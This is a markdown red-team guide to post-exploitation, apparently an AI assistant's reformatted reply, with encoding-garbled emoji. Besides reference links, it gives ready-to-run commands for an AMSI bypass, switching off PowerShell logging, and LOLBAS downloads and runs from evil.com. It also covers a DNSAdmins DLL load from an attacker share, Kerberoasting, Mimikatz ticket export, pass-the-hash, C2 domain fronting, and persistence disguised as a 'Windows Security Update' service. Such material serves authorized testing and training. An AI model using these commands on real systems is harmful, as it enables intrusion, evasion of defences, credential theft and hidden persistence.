# Post-Exploitation Resources Guide

> **üéØ Comprehensive collection of techniques, tools, and resources for post-exploitation activities**  
> *For authorized penetration testing and red team operations only*

---

## üîÑ Lateral Movement

### UAC Bypass Techniques
| Technique | Description | Reference |
|-----------|-------------|-----------|
| **Eventvwr File-less UAC Bypass** | CNA implementation for UAC bypass | [MDSec Guide](https://www.mdsec.co.uk/2016/12/cna-eventvwr-uac-bypass/) |
| **Sdclt.exe UAC Bypass** | Fileless UAC bypass using sdclt | [SpecterOps Research](https://posts.specterops.io/fileless-uac-bypass-using-sdclt-exe-3e9f9ad4e2b3) |
| **Registry Hijacking** | Eventvwr.exe and registry hijacking | [Enigma0x3 Blog](https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/) |
| **Disk Cleanup Bypass** | Windows 10 UAC bypass via disk cleanup | [Enigma0x3 Blog](https://enigma0x3.net/2016/07/22/bypassing-uac-on-windows-10-using-disk-cleanup/) |
| **App Paths Bypass** | UAC bypass using application paths | [Enigma0x3 Blog](https://enigma0x3.net/2017/03/14/bypassing-uac-using-app-paths/) |

### Advanced Lateral Movement
```powershell
# Excel Application DCOM Lateral Movement
$excel = [activator]::CreateInstance([type]::GetTypeFromProgID("Excel.Application", "target-host"))
$excel.Application.Run("calc.exe")

# WSH Injection Example
$wsh = [activator]::CreateInstance([type]::GetTypeFromProgID("WScript.Shell", "target-host"))
$wsh.Run("powershell.exe -enc <base64_payload>")
```

### Key Resources
- üìñ [Lateral Movement using Excel and DCOM](https://enigma0x3.net/2017/09/11/lateral-movement-using-excel-application-and-dcom/)
- üìñ [WSH Injection Case Study](https://posts.specterops.io/wsh-injection-a-case-study-fd35f79d29dd)
- üìñ [AMSI Bypass via COM Server Hijacking](https://posts.specterops.io/bypassing-amsi-via-com-server-hijacking-b8a3354d1aff)
- üìñ [Windows 10 Device Guard Bypasses](https://github.com/tyranid/DeviceGuardBypasses)

---

## ü©∏ BloodHound & Active Directory

### BloodHound Resources
- üîç [My First Go with BloodHound](https://blog.cobaltstrike.com/2016/12/14/my-first-go-with-bloodhound/)
- üîç [Lay of the Land with BloodHound](http://threat.tevora.com/lay-of-the-land-with-bloodhound/)
- üîç [Extending BloodHound for Red Teamers](https://www.youtube.com/watch?v=Pn7GWRXfgeI)

### Active Directory Attacks
```powershell
# DNSAdmins Privilege Escalation
dnscmd.exe /config /serverlevelplugindll \\attacker\share\evil.dll
sc.exe stop dns
sc.exe start dns

# Kerberoasting
Get-DomainUser -SPN | Get-DomainSPNTicket -Format Hashcat

# ASREPRoasting
Get-DomainUser -PreauthNotRequired | Get-DomainSPNTicket -Format Hashcat
```

### Key AD Resources
- üè∞ [Abusing DNSAdmins Privilege](http://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html)
- üè∞ [SQL Server Forest Trust Attacks](http://www.labofapenetrationtester.com/2017/03/using-sql-server-for-attacking-forest-trust.html)
- üè∞ [Guide to Attacking Domain Trusts](https://posts.specterops.io/a-guide-to-attacking-domain-trusts-971e52cb2944)

---

## üõ°Ô∏è Defense Evasion

### AMSI & PowerShell Evasion
```powershell
# AMSI Bypass Examples
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# PowerShell Logging Evasion
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Name "EnableScriptBlockLogging" -Value 0
```

### Application Whitelisting Bypasses
- üìã [Ultimate AppLocker Bypass List](https://github.com/api0cradle/UltimateAppLockerByPassList)
- üìã [Windows 7 UAC Whitelist](http://www.pretentiousname.com/misc/win7_uac_whitelist2.html)
- üìã [LOLBAS Project](https://github.com/LOLBAS-Project/LOLBAS)

### Key Evasion Resources
- üîí [PSAmsi - Anti-Malware Interface Interaction](http://www.irongeek.com/i.php?page=videos/derbycon7/t104-psamsi-an-offensive-powershell-module-for-interacting-with-the-anti-malware-scan-interface-in-windows-10-ryan-cobb)
- üîí [Process Doppelganging](https://hshrzd.wordpress.com/2017/12/18/process-doppelganging-a-new-way-to-impersonate-a-process/)
- üîí [Hiding Registry Keys with PSReflect](https://posts.specterops.io/hiding-registry-keys-with-psreflect-b18ec5ac8353)

---

## üèÉ‚Äç‚ôÇÔ∏è Living Off The Land

### Essential LOLBAS Techniques
| Binary | Technique | Example |
|--------|-----------|---------|
| **certutil.exe** | Download files | `certutil -urlcache -split -f http://evil.com/payload.exe` |
| **bitsadmin.exe** | File transfer | `bitsadmin /transfer job http://evil.com/file.exe C:\temp\file.exe` |
| **regsvr32.exe** | Execute scripts | `regsvr32 /s /n /u /i:http://evil.com/file.sct scrobj.dll` |
| **mshta.exe** | HTA execution | `mshta http://evil.com/payload.hta` |
| **rundll32.exe** | DLL execution | `rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";eval("code")` |

### Key Resources
- üîß [GTFO Bins (Linux)](https://gtfobins.github.io/)
- üîß [LOLBAS (Windows)](https://github.com/LOLBAS-Project/LOLBAS)

---

## üéÆ Command and Control (C2)

### C2 Framework Comparison
| Framework | Language | Stealth | Ease of Use | Features |
|-----------|----------|---------|-------------|----------|
| **Cobalt Strike** | Java | ‚≠ê‚≠ê‚≠ê‚≠ê‚≠ê | ‚≠ê‚≠ê‚≠ê‚≠ê | Full-featured commercial |
| **Empire** | PowerShell | ‚≠ê‚≠ê‚≠ê‚≠ê | ‚≠ê‚≠ê‚≠ê‚≠ê | PowerShell-based, free |
| **Metasploit** | Ruby | ‚≠ê‚≠ê‚≠ê | ‚≠ê‚≠ê‚≠ê‚≠ê‚≠ê | Comprehensive, well-known |
| **Merlin** | Go | ‚≠ê‚≠ê‚≠ê‚≠ê | ‚≠ê‚≠ê‚≠ê | HTTP/2 based |
| **Covenant** | C# | ‚≠ê‚≠ê‚≠ê‚≠ê | ‚≠ê‚≠ê‚≠ê | .NET focused |

### Infrastructure Setup
```bash
# Basic C2 Infrastructure with Redirectors
# Apache mod_rewrite for traffic filtering
RewriteEngine On
RewriteCond %{REQUEST_URI} ^/admin.*
RewriteRule ^.*$ http://teamserver:80%{REQUEST_URI} [P]
RewriteRule ^.*$ http://decoy-site.com%{REQUEST_URI} [R=302,L]

# Domain fronting with CloudFront
curl -H "Host: legitimate-domain.com" https://cloudfront-domain.com/beacon
```

### C2 Communication Channels
- üåê **HTTP/HTTPS**: [Cobalt Strike HTTP C2 Redirectors](https://bluescreenofjeff.com/2016-06-28-cobalt-strike-http-c2-redirectors-with-apache-mod_rewrite/)
- üìß **Email**: [C2 with Gmail](https://pentestlab.blog/2017/08/03/command-and-control-gmail/)
- üê¶ **Social Media**: [C2 with Twitter](https://pentestlab.blog/2017/09/26/command-and-control-twitter/)
- üåç **DNS**: [C2 with DNS](https://pentestlab.blog/2017/09/06/command-and-control-dns/)
- üìÅ **Cloud Storage**: [C2 with Dropbox](https://pentestlab.blog/2017/08/29/command-and-control-dropbox/)

### Advanced C2 Techniques
- üîí [Domain Fronting via CloudFront](https://www.mdsec.co.uk/2017/02/domain-fronting-via-cloudfront-alternate-domains/)
- üîí [TOR Fronting for Privacy](https://www.mdsec.co.uk/2017/02/tor-fronting-utilising-hidden-services-for-privacy/)
- üîí [Office 365 for C2](https://labs.mwrinfosecurity.com/blog/tasking-office-365-for-cobalt-strike-c2/)

---

## ‚¨ÜÔ∏è Privilege Escalation

### Windows Privilege Escalation
```powershell
# Quick Windows PrivEsc Checks
# Check current privileges
whoami /priv

# Look for unquoted service paths
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """

# Check for AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# Search for passwords in registry
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
```

### Linux Privilege Escalation
```bash
# Quick Linux PrivEsc Checks
# Check sudo permissions
sudo -l

# Find SUID binaries
find / -perm -u=s -type f 2>/dev/null

# Check for writable files in /etc
find /etc -writable -type f 2>/dev/null

# Look for interesting files
find / -name "*.conf" -o -name "*.config" -o -name "*.cfg" 2>/dev/null | grep -v proc
```

### Automated Enumeration Tools
| Tool | Platform | Description |
|------|----------|-------------|
| **WinPEAS** | Windows | Comprehensive Windows privilege escalation enumeration |
| **LinPEAS** | Linux | Linux privilege escalation awesome script |
| **LinEnum** | Linux | Linux enumeration script |
| **PowerUp** | Windows | PowerShell privilege escalation framework |
| **BeRoot** | Cross-platform | Privilege escalation path discovery |

### Key Resources
- üìã [Windows Privilege Escalation Checklist](https://book.hacktricks.xyz/windows/checklist-windows-privilege-escalation)
- üìã [Linux Privilege Escalation Checklist](https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist)
- üîß [WinPEAS - Windows PrivEsc Script](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)
- üîß [LinPEAS - Linux PrivEsc Script](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)
- üîß [LinEnum - Linux Enumeration](https://github.com/rebootuser/LinEnum)

---

## üîê Credential Access & Token Manipulation

### Windows Token Manipulation
```powershell
# Token impersonation with PowerShell
# Get system tokens
Get-Process | Where-Object {$_.ProcessName -eq "winlogon"} | Select-Object Id
# Impersonate token
Invoke-TokenManipulation -ImpersonateUser -Username "DOMAIN\Administrator"

# Pass-the-Hash attacks
Invoke-WMIExec -Target 192.168.1.100 -Username Administrator -Hash 32196B56FFE6F45E294117B91A83BF38

# Pass-the-Ticket attacks
Invoke-Mimikatz -Command '"sekurlsa::tickets /export"'
Invoke-Mimikatz -Command '"kerberos::ptt ticket.kirbi"'
```

### Credential Harvesting
- üîë [Windows Access Tokens and Alternate Credentials](https://blog.cobaltstrike.com/2015/12/16/windows-access-tokens-and-alternate-credentials/)
- üîë [Bringing Hashes Home with reGeorg & Empire](https://sensepost.com/blog/2016/bringing-the-hashes-home-with-regeorg-empire/)
- üîë [Intercepting Passwords with Empire](https://sensepost.com/blog/2016/intercepting-passwords-with-empire-and-winning/)

---

## üìß Persistence Techniques

### Registry-Based Persistence
```powershell
# Run key persistence
New-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "SecurityUpdate" -Value "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File C:\temp\payload.ps1"

# Winlogon persistence
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name "Shell" -Value "explorer.exe,C:\temp\backdoor.exe"
```

### Service-Based Persistence
```powershell
# Create malicious service
New-Service -Name "WindowsSecurityUpdate" -BinaryPathName "C:\temp\service.exe" -DisplayName "Windows Security Update Service" -StartupType Automatic
```

### Outlook-Based Persistence
- üìß [Outlook Home Page Vector](https://sensepost.com/blog/2017/outlook-home-page-another-ruler-vector/)
- üìß [Outlook Forms and Shells](https://sensepost.com/blog/2017/outlook-forms-and-shells/)

---

## üõ†Ô∏è Useful Tools & Scripts

### Reverse Shell Generators
- üîÑ [Reverse Shell Generator (Code)](https://github.com/0dayCTF/reverse-shell-generator)
- üîÑ [RevShells.com (Web Interface)](https://www.revshells.com/)

### Infrastructure Tools
- üèóÔ∏è [Red Team Infrastructure Wiki](https://github.com/bluscreenofjeff/Red-Team-Infrastructure-Wiki)
- üèóÔ∏è [Domain Hunter](https://github.com/minisllc/domainhunter)
- üèóÔ∏è [Finding Frontable Domains](https://github.com/rvrsh3ll/FindFrontableDomains)
- üèóÔ∏è [Apache2 Mod Rewrite Setup](https://github.com/n0pe-sled/Apache2-Mod-Rewrite-Setup)

### C2 Matrix & Comparison
- üìä [C2 Matrix - Framework Comparison](https://www.thec2matrix.com/)

---

## üìö Essential Reading & Research

### OPSEC & Operational Security
- üîí [OPSEC Considerations for Beacon Commands](https://blog.cobaltstrike.com/2017/06/23/opsec-considerations-for-beacon-commands/)
- üîí [Safe Red Team Infrastructure](https://medium.com/@malcomvetter/safe-red-team-infrastructure-c5d6a0f13fac)
- üîí [Attack Infrastructure Log Aggregation](https://posts.specterops.io/attack-infrastructure-log-aggregation-and-monitoring-345e4173044e)

### Red Team Operations
- üéØ [Infrastructure for Ongoing Red Team Operations](https://blog.cobaltstrike.com/2014/09/09/infrastructure-for-ongoing-red-team-operations/)
- üéØ [6 Red Team Infrastructure Tips](https://cybersyndicates.com/2016/11/top-red-team-tips/)
- üéØ [Agentless Post Exploitation](https://blog.cobaltstrike.com/2016/11/03/agentless-post-exploitation/)

### Advanced Techniques
- üß† [Command and Control Using Active Directory](http://www.harmj0y.net/blog/powershell/command-and-control-using-active-directory/)
- üß† [Malicious Application Compatibility Shims](https://www.blackhat.com/docs/eu-15/materials/eu-15-Pierce-Defending-Against-Malicious-Application-Compatibility-Shims-wp.pdf)
- üß† [Environment Variables for UAC Bypass](https://tyranidslair.blogspot.ru/2017/05/exploiting-environment-variables-in.html)

---

## üîç UAC Bypass Deep Dive

### Comprehensive UAC Bypass Resources
1. üìñ [Reading Your Way Around UAC - Part 1](https://tyranidslair.blogspot.ru/2017/05/reading-your-way-around-uac-part-1.html)
2. üìñ [Reading Your Way Around UAC - Part 2](https://tyranidslair.blogspot.ru/2017/05/reading-your-way-around-uac-part-2.html)
3. üìñ [Reading Your Way Around UAC - Part 3](https://tyranidslair.blogspot.ru/2017/05/reading-your-way-around-uac-part-3.html)

### Additional UAC Techniques
- üîì [IARPUninstallStringLauncher COM Interface](http://www.freebuf.com/articles/system/116611.html)
- üîì [UAC Bypass - Three Escalations Story](https://habrahabr.ru/company/pm/blog/328008/)
- üîì [CMSTP.exe Research](https://msitpros.com/?p=3960)
- üîì [First Entry: Fileless UAC Bypass](https://winscripting.blog/2017/05/12/first-entry-welcome-and-uac-bypass/)

---

## üéØ Quick Reference Commands

### Windows Post-Exploitation
```powershell
# System information
systeminfo
whoami /all
net user
net localgroup administrators

# Network information
ipconfig /all
netstat -an
arp -a
route print

# Process and service enumeration
tasklist /svc
wmic process list full
sc query
```

### Linux Post-Exploitation
```bash
# System information
uname -a
id
cat /etc/passwd
cat /etc/group

# Network information
ifconfig -a
netstat -tulpn
ss -tulpn
cat /etc/hosts

# Process enumeration
ps aux
systemctl list-units --type=service
```

---

**üìÖ Updated**: December 2024 | **üë§ Author**: Red Team Collective | **‚öñÔ∏è Legal Notice**: For authorized testing only

> **üõ°Ô∏è Ethical Use Reminder**: These resources are for legitimate security testing, research, and educational purposes. Always ensure proper authorization before conducting any security testing activities.

---

## üìñ Additional Resources

### Blogs & Research Sites
- [SpecterOps Blog](https://posts.specterops.io/)
- [Harmj0y Blog](http://www.harmj0y.net/blog/)
- [Enigma0x3 Blog](https://enigma0x3.net/)
- [PentestLab Blog](https://pentestlab.blog/)
- [MDSec Research](https://www.mdsec.co.uk/research/)

### Training & Certification
- [SANS SEC564: Red Team Operations](https://www.sans.org/cyber-security-courses/red-team-operations-and-threat-emulation/)
- [Cobalt Strike Training](https://www.cobaltstrike.com/training)
- [Red Team Development and Operations](https://www.zeropointsecurity.co.uk/red-team-ops)

This comprehensive guide serves as a centralized resource for post-exploitation techniques, tools, and methodologies used in authorized red team operations and penetration testing engagements.
```

This enhanced version provides:

‚úÖ **Better Organization** - Clear sections with icons and categories  
‚úÖ **Practical Examples** - Code snippets and command examples  
‚úÖ **Comparison Tables** - Easy-to-scan tool and technique comparisons  
‚úÖ **Quick Reference** - Essential commands for both Windows and Linux  
‚úÖ **Visual Hierarchy** - Proper markdown formatting with headers and emphasis  
‚úÖ **Comprehensive Coverage** - All original resources plus additional context  
‚úÖ **Professional Structure** - Logical flow from lateral movement to persistence  

The guide is now much more readable and practical for security professionals! üöÄ
```
